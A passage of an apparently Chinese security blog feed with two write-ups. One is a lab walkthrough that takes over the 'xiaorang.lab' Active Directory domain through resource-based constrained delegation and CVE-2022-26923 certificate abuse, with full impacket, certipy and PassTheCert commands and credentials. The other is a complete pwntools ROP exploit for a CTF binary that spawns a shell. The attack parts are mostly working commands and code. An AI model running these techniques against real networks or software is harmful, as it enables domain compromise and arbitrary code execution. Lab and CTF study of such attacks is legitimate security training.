punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS<span class="token number">2</span> Objects returned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没什么可用的</p><p>那自己的ACL呢</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>lixiuying<span class="token punctuation">\</span>Desktop<span class="token operator">></span>Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"DC=xiaorang,DC=lab"</span> nTSecurityDescriptor -sddl+++ <span class="token parameter variable">-sddlfilter</span> <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token string">"S-1-5-21-3745972894-1678056601-2622918667-1131"</span> <span class="token parameter variable">-recmute</span>AdFind V01.62.00cpp Joe Richards <span class="token punctuation">(</span>support@joeware.net<span class="token punctuation">)</span> October <span class="token number">2023</span>Using server: XR-DC01.xiaorang.lab:389Directory: Windows Server <span class="token number">2016</span><span class="token number">0</span> Objects returned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>什么都找不到</p><p>好像是没权限？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"CN=lixiuying,CN=Users,DC=xiaorang,DC=lab"</span> nTSecurityDescriptor -sddl+++<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd2fae6fa083d23490fe8d477b8129ea_MD5.jpeg"></p><h4 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h4><p>一键搜集</p><p><img src="/Rxi134_FILE/53ce45ec16dbccb87976dd506aac053c_MD5.jpeg"></p><p><img src="/Rxi134_FILE/9bf6f31f952402612957c3bcd3d28ca9_MD5.jpeg"></p><p>（为什么adfind找不到东西bloodhound却可以？不都是依靠ldap协议吗，此处存疑）</p><h4 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h4><p>添个机器用户，再改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为这个机器用户的sid，即可完成基于资源约束性委派</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python addcomputer.py <span class="token string">"xiaorang.lab/lixiuying:winniethepooh"</span> -computer-name <span class="token string">"machine$"</span> -computer-pass <span class="token string">"root"</span> -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-debug</span>proxychains <span class="token parameter variable">-q</span> python rbcd.py <span class="token string">"xiaorang.lab/lixiuying:winniethepooh"</span> -delegate-to <span class="token string">'XR-0687$'</span> -delegate-from <span class="token string">'machine$'</span> -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-action</span> <span class="token function">write</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>别忘了绑定域名到 hosts</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.13    xiaorang.lab172.22.15.35    XR-0687.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>申请对 cifs spn 的 TGT</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains python getST.py <span class="token string">"xiaorang.lab/machine$:root"</span> <span class="token parameter variable">-spn</span> cifs/XR-0687.xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-impersonate</span> administrator <span class="token parameter variable">-debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/c550f760429618e005475d4624a506cf_MD5.jpeg"></p><p>导入票据即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccacheproxychains python psexec.py -no-pass <span class="token parameter variable">-k</span> XR-0687.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/7796a10405fb0a231c4a30d5862cbdb8_MD5.jpeg"></p><h4 id="获取flag03"><a href="#获取flag03" class="headerlink" title="获取flag03"></a>获取flag03</h4><p><img src="/Rxi134_FILE/a81b8c4844815a1e353ac3b4510d3c60_MD5.jpeg"></p><h2 id="172-22-15-18-XR-CA"><a href="#172-22-15-18-XR-CA" class="headerlink" title="172.22.15.18 XR-CA"></a>172.22.15.18 XR-CA</h2><p>证书服务器，这个域多半注册了企业OA，扫扫端口机子本身没什么暴露的服务，有 IIS 80 说明是注册了web服务的</p><h2 id="172-22-15-13-XR-DC01"><a href="#172-22-15-13-XR-DC01" class="headerlink" title="172.22.15.13 XR-DC01"></a>172.22.15.13 XR-DC01</h2><h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><h4 id="尝试-ADCS-获取Hash（失败）"><a href="#尝试-ADCS-获取Hash（失败）" class="headerlink" title="尝试 ADCS 获取Hash（失败）"></a>尝试 ADCS 获取Hash（失败）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad <span class="token function">find</span> <span class="token parameter variable">-u</span> lixiuying@xiaorang.lab <span class="token parameter variable">-p</span> winniethepooh -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/db88701c9c77bc971a1034afac5de7f1_MD5.jpeg"></p><p>这里利用 CVE-2022-26923 ADCS 域提权漏洞</p><blockquote><p>该漏洞产生的主要原因是 ADCS 服务器在处理计算机模板证书时是通过机器的 <code>dNSHostName</code> 属性来辨别用户的，而普通域用户即有权限修改它所创建的机器账户的 dNSHostName 属性，因此恶意攻击者可以创建一个机器账户，然后修改它的 dNSHostName 属性为域控的 dNSHostName ，然后去请求计算机模板的证书。<br>由于 ADCS 服务器在生成证书时会将域控的 dNSHostName 属性写入证书中。当使用证书进行 PKINIT Kerberos 认证时，KDC会查询活动目录中 SAMAccountName 属性为 “dNSHostName-域名+$” 的对象，此时会査询到域控，因此会以域控机器账户的权限生成 PAC 放入票据中。又由于域控机器账户默认具有 DCSync 权限，因此攻击者可通过该票据导出域内任意用户的 Hash。<br><img src="/Rxi134_FILE/384be14ca14d5edf67063e2917bcf4db_MD5.jpeg"></p></blockquote><p>确定下颁发机构<br><img src="/Rxi134_FILE/84801a3fef642c78a22ca598919a73ed_MD5.jpeg"></p><p>首先绑定域名别忘了</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.13    XR-DC01.xiaorang.lab172.22.15.13    xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>添加机器用户（别跟前面的打架了）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad account create <span class="token parameter variable">-user</span> <span class="token string">'machine1$'</span> <span class="token parameter variable">-pass</span> <span class="token string">'root'</span> <span class="token parameter variable">-dns</span> XR-DC01.xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-u</span> lixiuying <span class="token parameter variable">-p</span> <span class="token string">'winniethepooh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>申请机器证书模板</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad req <span class="token parameter variable">-u</span> <span class="token string">'machine1$@xiaorang.lab'</span> <span class="token parameter variable">-p</span> <span class="token string">'root'</span> <span class="token parameter variable">-ca</span> <span class="token string">'xiaorang-XR-CA-CA'</span> <span class="token parameter variable">-target</span> <span class="token number">172.22</span>.15.18 <span class="token parameter variable">-template</span> <span class="token string">'Machine'</span> <span class="token parameter variable">-debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/b02d6002e642f3459c685e03f1b08893_MD5.jpeg"></p><p>然后去申请一张TGT，依微软官方所说，在利用证书进行kerberos认证的时候，PAC缓冲区里会返回NTLM hash。所以以此来捕获 <code>DC01$</code>的哈希</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad auth <span class="token parameter variable">-pfx</span> xr-dc01.pfx -dc-ip <span class="token number">172.22</span>.15.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/244ab2a93ff3479f2220855731b3fb37_MD5.jpeg"><br>爆出了 KDC_ERR_PADATA_TYPE_NOSUPP 错误</p><p><img src="/Rxi134_FILE/a879e6e55461f5619a940719c75d5d02_MD5.jpeg"></p><h4 id="ADCS-RBCD"><a href="#ADCS-RBCD" class="headerlink" title="ADCS+RBCD"></a>ADCS+RBCD</h4><blockquote><p>不过包括 LDAP 在内的多种协议都支持 Schannel，可以尝试通过 Secure Channel 将证书认证到 LDAPS，放弃使用 Kerberos PKINIT</p></blockquote><blockquote><p>工具地址：<a href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">PassTheCert&#x2F;Python at main · AlmondOffSec&#x2F;PassTheCert</a></p></blockquote><p>提取出.pfx的证书和私钥部分</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certipy-ad cert <span class="token parameter variable">-pfx</span> xr-dc01.pfx <span class="token parameter variable">-nokey</span> <span class="token parameter variable">-out</span> dc01.crtcertipy-ad cert <span class="token parameter variable">-pfx</span> xr-dc01.pfx <span class="token parameter variable">-nocert</span> <span class="token parameter variable">-out</span> dc01.key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试能不能登录上域控机器账户，成功即可授予委派</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python passthecert.py <span class="token parameter variable">-action</span> <span class="token function">whoami</span> <span class="token parameter variable">-crt</span> dc01.crt <span class="token parameter variable">-key</span> dc01.key <span class="token parameter variable">-domain</span> xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13proxychains <span class="token parameter variable">-q</span> python passthecert.py <span class="token parameter variable">-action</span> write_rbcd <span class="token parameter variable">-crt</span> dc01.crt <span class="token parameter variable">-key</span> dc01.key <span class="token parameter variable">-domain</span> xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 -delegate-to <span class="token string">'XR-DC01$'</span> -delegate-from <span class="token string">'machine1$'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/ceca311c647146851bf322d55ebe6305_MD5.jpeg"></p><p>然后就是RBCD的正常流程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python getST.py xiaorang.lab/<span class="token string">'machine1$'</span><span class="token builtin class-name">:</span><span class="token string">'root'</span> -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-spn</span> cifs/XR-DC01.xiaorang.lab <span class="token parameter variable">-impersonate</span> Administrator <span class="token parameter variable">-debug</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccacheproxychains <span class="token parameter variable">-q</span> python psexec.py XR-DC01.xiaorang.lab -no-pass <span class="token parameter variable">-k</span> -target-ip <span class="token number">172.22</span>.15.13 -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>SYSTEM<br><img src="/Rxi134_FILE/c9a7808c704e88e41bb98d69b573d283_MD5.jpeg"></p><h4 id="获取flag04"><a href="#获取flag04" class="headerlink" title="获取flag04"></a>获取flag04</h4><p><img src="/Rxi134_FILE/a7d9272df2817ac3259a387d9efb6383_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>为什么 bloodhound 能查到acl，adfind就找不到？（此处存疑）</li><li>狠狠去学习了一波ADCS，感觉这个漏洞危害很大，搭环境测试发现只要默认设置了企业CA就能利用。微软针对这一漏洞发布了补丁：<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">CVE-2022-26923 - 安全更新程序指南 - Microsoft - Active Directory Domain Services Elevation of Privilege Vulnerability</a></li></ul><p>另外在查看wp的时候还发现有一种RBCD的方法，不申请cifs而是申请目标ldap spn的TGT再配上secretdump来导出域内全部用户的Hash来接管域，很妙的思路</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届西湖论剑2024初赛</title>
      <link href="/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024%E5%88%9D%E8%B5%9B/"/>
      <url>/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>可以改到计数器实现任意地址读写<br><img src="/EXP_FILE/1578558d45ec2bfb0e705ecd46d40b55_MD5.jpeg"></p><p>写 int 有一定概率成功，要多试几次</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Enter your choice: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter the index to edit (0-based): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter the new value: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter the value to push: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">oow</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>edit<span class="token punctuation">(</span>idx<span class="token punctuation">,</span>ptr<span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>ptr<span class="token operator">>></span><span class="token number">4</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>push<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>push<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#dbg('b *$rebase(0x00000000000015C1)')#idx 0x7fffffffdd70</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x00000000000017D0)\nc\n'</span><span class="token punctuation">)</span> <span class="token comment">#edit_ret</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>part1<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>part2<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>leak<span class="token operator">=</span><span class="token punctuation">(</span>part2<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>part1libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x29d90</span>lg<span class="token punctuation">(</span><span class="token string">"leak"</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">"libc"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x000000000002a3e5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressbinsh<span class="token operator">=</span><span class="token number">0x00000000001d8678</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressret<span class="token operator">=</span><span class="token number">0x0000000000029139</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresslg<span class="token punctuation">(</span><span class="token string">'rdi'</span><span class="token punctuation">,</span>rdi<span class="token punctuation">)</span><span class="token comment">#push(0xdeadbeef)</span>oow<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span>rdi<span class="token punctuation">)</span>oow<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span>binsh<span class="token punctuation">)</span>oow<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span>oow<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span><span class="token comment">#edit(19,0x7ffff7)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 